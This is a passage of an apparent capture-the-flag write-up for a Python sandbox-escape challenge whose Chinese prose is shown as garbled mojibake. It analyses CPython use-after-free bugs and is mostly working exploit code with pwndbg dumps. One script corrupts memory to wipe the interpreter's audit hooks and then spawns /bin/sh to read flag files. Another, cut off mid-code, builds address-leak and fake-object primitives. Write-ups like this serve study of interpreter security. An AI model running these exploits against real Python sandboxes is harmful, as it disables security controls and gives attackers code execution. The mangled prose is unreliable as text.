class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">if</span> other <span class="hljs-keyword">is</span> d:<br><span class="hljs-meta">... </span>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Broke encapsulation&quot;</span>)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__ror__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> self.__or__(other)<br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proxy | SneakyOr()<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">6</span>, <span class="hljs-keyword">in</span> __ror__<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> __or__<br>RuntimeError: Broke encapsulation<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_or</span><span class="hljs-params">(PyObject *left, PyObject *right)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(left, &amp;PyDictProxy_Type)) &#123;<br>        left = ((mappingproxyobject*)left)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (PyObject_TypeCheck(right, &amp;PyDictProxy_Type)) &#123;<br>        right = ((mappingproxyobject*)right)-&gt;mapping;<br>    &#125;<br>    <span class="hljs-keyword">return</span> PyNumber_Or(left, right);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="éæ³•ä¿®æ”¹ï¼Œç„¶åå‘¢ï¼Ÿ"><a href="#éæ³•ä¿®æ”¹ï¼Œç„¶åå‘¢ï¼Ÿ" class="headerlink" title="éæ³•ä¿®æ”¹ï¼Œç„¶åå‘¢ï¼Ÿ"></a>éæ³•ä¿®æ”¹ï¼Œç„¶åå‘¢ï¼Ÿ</h2><p>å…ˆè¿‡ä¸€ééƒ¨åˆ†expçš„æ‰§è¡Œæµç¨‹å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br></code></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹</p><ul><li><p>æ–°å»ºäº†ä¸€ä¸ªtype tï¼Œè‡ªå¸¦ä¸€ä¸ªbytearray aï¼Œè¿˜æœ‰è‡ªå®ç°çš„__ror__å’Œ__or__æ–¹æ³•</p><img src="/2024/08/31/sekai2024jailwp/bytearray_a.png" class title="bytearray_a"></li><li><p>ç„¶åè¿›è¡Œä¸€ä¸ªt.__dict__å’Œt()çš„or</p><img src="/2024/08/31/sekai2024jailwp/or1.png" class title="or1"><ul><li><p>mappingproxyobjectçš„t.__dict__</p><img src="/2024/08/31/sekai2024jailwp/or1_proxy.png" class title="or1_proxy"><p>v-&gt;mappingæŒ‡å‘ä¸€ä¸ªPyDictObject</p><img src="/2024/08/31/sekai2024jailwp/or1_dict.png" class title="or1_dict"></li><li><p>tç±»å‹çš„PyObjectå®ä¾‹</p><img src="/2024/08/31/sekai2024jailwp/or1_w.png" class title="or1_w"><p>PyTypeObjectçš„type t</p><img src="/2024/08/31/sekai2024jailwp/or1_w_type.png" class title="or1_w_type"><p>å¯ä»¥å‘ç°v-&gt;mappingå’Œw-&gt;ob_base.ob_type-&gt;tp_dictæŒ‡å‘åŒä¸€ä¸ªPyDictObject</p><img src="/2024/08/31/sekai2024jailwp/or1_dict_mapping.png" class title="or1_dict_mapping"></li></ul></li><li><p>ç»è¿‡ä¸€æ¬¡mappingproxy_orï¼Œå»é™¤äº†mappingproxy-&gt;mappingçš„wrapï¼Œè¿›è¡Œä¸€ä¸ªdictå’Œt()çš„or</p><img src="/2024/08/31/sekai2024jailwp/or2.png" class title="or2"><img src="/2024/08/31/sekai2024jailwp/or2_w_v.png" class title="or2_w_v"></li><li><p>åœ¨__or__ä¸­è·å–aï¼Œè¿™æ—¶å€™selfæ˜¯type tçš„PyObjectï¼Œotheræ˜¯PyDictObject</p><img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" class title="get_a_1_ins"><img src="/2024/08/31/sekai2024jailwp/get_a_1.png" class title="get_a_1"><p>è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå°†açš„ref+1ï¼Œä½†ç”±äºåªæ˜¯å–äº†aä»€ä¹ˆéƒ½æ²¡å¹²ï¼Œæ‰€ä»¥ä¹‹årefä¼šå‡å›1</p><img src="/2024/08/31/sekai2024jailwp/a_1_ref.png" class title="a_1_ref"></li><li><p>ä¹‹åä»otherä¸­åˆ é™¤aï¼Œè¿™æ—¶å€™otherå·²ç»æ˜¯dictäº†</p><img src="/2024/08/31/sekai2024jailwp/del_a.png" class title="del_a"><img src="/2024/08/31/sekai2024jailwp/del_a_obj.png" class title="del_a_obj"><p>å¹¶ä¸”å°†açš„ref-1ï¼Œè¿™æ—¶å€™açš„refå·²ç»æ˜¯0äº†ï¼Œæ‰€ä»¥è°ƒç”¨bytearray_deallocå°†aå’Œa-&gt;ob_byteséƒ½freeäº†</p><img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" class title="a_0_ref"><img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" class title="dealloc_a"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">bytearray_dealloc</span><span class="hljs-params">(PyByteArrayObject *self)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_exports &gt; <span class="hljs-number">0</span>) &#123;<br>        PyErr_SetString(PyExc_SystemError,<br>                        <span class="hljs-string">&quot;deallocated bytearray object has exported buffers&quot;</span>);<br>        PyErr_Print();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_bytes != <span class="hljs-number">0</span>) &#123;<br>        PyObject_Free(self-&gt;ob_bytes);<br>    &#125;<br>    Py_TYPE(self)-&gt;tp_free((PyObject *)self);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç„¶ååˆé€šè¿‡self.aï¼ˆtype tçš„PyObjectï¼‰è·å–åˆ°äº†a</p><img src="/2024/08/31/sekai2024jailwp/get_a_2.png" class title="get_a_2"><img src="/2024/08/31/sekai2024jailwp/get_a_2_obj.png" class title="get_a_2_obj"><img src="/2024/08/31/sekai2024jailwp/a_1_ref_2.png" class title="a_1_ref_2"></li></ul><p><em>â€¦</em></p><p><em>â€¦â€¦</em></p><p><em>ï¼Ÿï¼Ÿï¼Ÿå•Šï¼Ÿï¼Ÿï¼Ÿ</em></p><h2 id="çœ‹ä¼¼æ²¡æœ‰é—®é¢˜å®åˆ™å…¨æ˜¯é—®é¢˜â€¦â€¦"><a href="#çœ‹ä¼¼æ²¡æœ‰é—®é¢˜å®åˆ™å…¨æ˜¯é—®é¢˜â€¦â€¦" class="headerlink" title="çœ‹ä¼¼æ²¡æœ‰é—®é¢˜å®åˆ™å…¨æ˜¯é—®é¢˜â€¦â€¦"></a>çœ‹ä¼¼æ²¡æœ‰é—®é¢˜å®åˆ™å…¨æ˜¯é—®é¢˜â€¦â€¦</h2><ul><li><p>é¦–å…ˆç¬¬äºŒæ¬¡PyObject_GenericGetAttrå°±ä¸è¯¥è·å–åˆ°aï¼Œå› ä¸ºaå·²ç»ä»dictä¸­åˆ é™¤äº†</p><img src="/2024/08/31/sekai2024jailwp/test_print.png" class title="test_print"><p>â€¦â€¦çœ‹èµ·æ¥ç¡®å®ä¹Ÿæ˜¯åˆ æ‰äº†</p></li><li><p>delitem_commonç»“å°¾açš„refç¡®å®ä¹Ÿå‡åˆ°0äº†ï¼Œä¹Ÿç¡®å®è°ƒç”¨deallocæŠŠa freeäº†â€¦â€¦</p><img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" class title="a_0_ref"><img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" class title="dealloc_a"></li><li><p>ä¸¤æ¬¡PyObject_GenericGetAttrçš„å‚æ•°ä¹Ÿæ˜¯ä¸€æ ·çš„</p><img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" class title="get_a_1_ins"><img src="/2024/08/31/sekai2024jailwp/get_a_2.png" class title="get_a_2"></li><li><p>èƒ½æƒ³åˆ°çš„å°±æ˜¯get aæ˜¯é€šè¿‡typeè¿›è¡Œçš„ï¼Œdel aæ˜¯é€šè¿‡dictè¿›è¡Œçš„</p></li></ul><h2 id="PyType-Lookup"><a href="#PyType-Lookup" class="headerlink" title="_PyType_Lookup"></a>_PyType_Lookup</h2><p>é‚£å°±æ¥çœ‹çœ‹PyObject_GenericGetAttræ˜¯æ€ä¹ˆè·å–açš„</p><ul><li>PyObject_GenericGetAttrè°ƒç”¨_PyObject_GenericGetAttrWithDict</li><li>_PyObject_GenericGetAttrWithDictå¤§è‡´æµç¨‹<ul><li>è°ƒç”¨_PyType_Lookupä»typeä¸­å°è¯•è·å–name</li><li>å°è¯•ä»å®ä¾‹ä¸­è·å–name</li></ul></li></ul><p><em><strong>é—®é¢˜å°±å‡ºåœ¨_PyType_Lookupé‡Œï¼ï¼ï¼</strong></em></p><p>_PyType_Lookupçš„æµç¨‹</p><ul><li>å…ˆå°è¯•ä»type_cacheä¸­æŸ¥æ‰¾name</li><li>æ‰¾ä¸åˆ°åˆ™ä»type-&gt;tp_dictï¼ˆå°±æ˜¯dictï¼‰æŸ¥æ‰¾</li><li>å°†PyObjectåŠ å…¥cache</li></ul><p><em>å¯¹äº†ï¼Œå°±æ˜¯è¿™ä¸ªcacheâ€¦â€¦</em></p><ul><li>ç¬¬ä¸€æ¬¡self.açš„æ—¶å€™ä¼šå°†aæ”¾è¿›cacheï¼Œä¸”ä¸ä¼šé€’å¢açš„ref</li><li>ç¬¬äºŒæ¬¡self.açš„æ—¶å€™ç›´æ¥ä»cacheä¸­å–</li></ul><p><em>ç»ˆäºçŸ¥é“ç¬¬ä¸€ä¸ªæ²¡ç”¨çš„self.aæ˜¯å¹²å˜›çš„äº†ï¼Œå°±æ˜¯ä¸ºäº†æŠŠå®ƒæ”¾è¿›cache</em></p><ul><li>ç”±äºdeallocäº†aä½†æ²¡å°†aä»cacheä¸­åˆ æ‰å¯¼è‡´äº†uaf</li><li>ç†è®ºä¸Šæ¥è¯´typeæ˜¯ä¸å¯å†™çš„æ‰€ä»¥cacheæ”¾è¿›å»å°±ä¸ä¼šå†å–å‡ºæ¥äº†</li><li>ä½†å‡å®šçš„typeçš„ä¸å¯å†™è¢«æ‰“ç ´äº†å°±å‡ºé—®é¢˜äº†</li></ul><p><strong>ç»“è®ºï¼šæœ‰äº›è¿‡ç¨‹æ˜¯åŸºäºä¸å¯å†™çš„å‡å®šè¿›è¡Œçš„ï¼Œè¿™ä¸ªå‡å®šè¢«æ‰“ç ´äº†å°±å‡ºé—®é¢˜äº†</strong></p><h1 id="å‡ ç§è§£æ³•"><a href="#å‡ ç§è§£æ³•" class="headerlink" title="å‡ ç§è§£æ³•"></a>å‡ ç§è§£æ³•</h1><h2 id="åˆ©ç”¨memoryviewçš„indexçš„uaf"><a href="#åˆ©ç”¨memoryviewçš„indexçš„uaf" class="headerlink" title="åˆ©ç”¨memoryviewçš„indexçš„uaf"></a>åˆ©ç”¨memoryviewçš„indexçš„uaf</h2><p>å…ˆè´´exp</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># implementation from https://github.com/chilaxan/pysnippets/blob/main/tricky_bugs.py#L51</span><br><span class="hljs-comment"># but modified to work with current version. Abuses how the `c` format doesn&#x27;t have a release</span><br><span class="hljs-comment"># check after running our __index__ func</span><br><br>uaf_backing = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)<br>uaf_view = <span class="hljs-built_in">memoryview</span>(uaf_backing).cast(<span class="hljs-string">&#x27;c&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">weird_index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__index__</span>(<span class="hljs-params">self</span>):<br>        uaf_view.release()<br>        self.memory_backing = uaf_backing.clear() <span class="hljs-keyword">or</span> <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x17</span><br><br>uaf_view[w:=weird_index()] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x7f</span>])<br><br>mem = w.memory_backing<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    mem[py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span> + i] = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><ul><li><p>uaf_backingåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_backing</span><br><br>pwndbg&gt; print obj<br>$<span class="hljs-number">2</span> = (PyObject *) <span class="hljs-number">0x7f94e2c6ed30</span><br>pwndbg&gt; print *(PyByteArrayObject*)obj<br>$<span class="hljs-number">3</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">56</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">57</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>uaf_viewåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_view</span><br><br>pwndbg&gt; print *(PyMemoryViewObject*)<span class="hljs-number">0x7f94e2df9600</span><br>$<span class="hljs-number">5</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03551c0</span> &lt;PyMemoryView_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">3</span><br>  &#125;,<br>  mbuf = <span class="hljs-number">0x7f94e2c7a2c0</span>,<br>  hash = <span class="hljs-number">-1</span>,<br>  flags = <span class="hljs-number">6</span>,<br>  exports = <span class="hljs-number">0</span>,<br>  view = &#123;<br>    buf = <span class="hljs-number">0x7f94e2c6f230</span>,<br>    obj = <span class="hljs-number">0x7f94e2c6ed30</span>,<br>    len = <span class="hljs-number">56</span>,<br>    itemsize = <span class="hljs-number">1</span>,<br>    readonly = <span class="hljs-number">0</span>,<br>    ndim = <span class="hljs-number">1</span>,<br>    format = <span class="hljs-number">0x5648e00d2041</span> <span class="hljs-string">&quot;B&quot;</span>,<br>    shape = <span class="hljs-number">0x7f94e2df9690</span>,<br>    strides = <span class="hljs-number">0x7f94e2df9698</span>,<br>    suboffsets = <span class="hljs-number">0x0</span>,<br>    internal = <span class="hljs-number">0x0</span><br>  &#125;,<br>  weakreflist = <span class="hljs-number">0x0</span>,<br>  ob_array = &#123;<span class="hljs-number">56</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>clearåçš„uaf_backingï¼Œuaf_view-&gt;view.bufå·²è¢«free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// clear</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6ed30</span><br>$<span class="hljs-number">13</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">2</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">1</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ–°çš„PyByteArrayObjectï¼Œè¢«èµ‹å€¼ç»™äº†w.memory_backing</p><ul><li>å’Œuaf_view-&gt;view.bufä½¿ç”¨åŒä¸€å—å†…å­˜</li><li>ç”±äºbytearray()æ²¡æœ‰å‚æ•°æ‰€ä»¥ob_sizeä¸º0ä¸”ä¸åˆ†é…ob_bytes</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// w.memory_backing</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">17</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>å‘åŸå…ˆçš„uaf_view-&gt;view.buf[0x17]ä¸­å†™å…¥0x7fï¼Œw.memory_backingçš„ob_sizeè¢«ä¿®æ”¹ä¸ºæå¤§å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// new</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">28</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">9151314442816847872</span><span class="hljs-comment">// 0x7f00000000000000</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ”¹_PyRuntime.audit_hooks</p><img src="/2024/08/31/sekai2024jailwp/audit_hook.png" class title="audit_hook"></li></ul><h2 id="åˆ©ç”¨mappingproxy-orçš„uaf"><a href="#åˆ©ç”¨mappingproxy-orçš„uaf" class="headerlink" title="åˆ©ç”¨mappingproxy_orçš„uaf"></a>åˆ©ç”¨mappingproxy_orçš„uaf</h2><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>):<br>    b[<span class="hljs-number">0</span>] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span 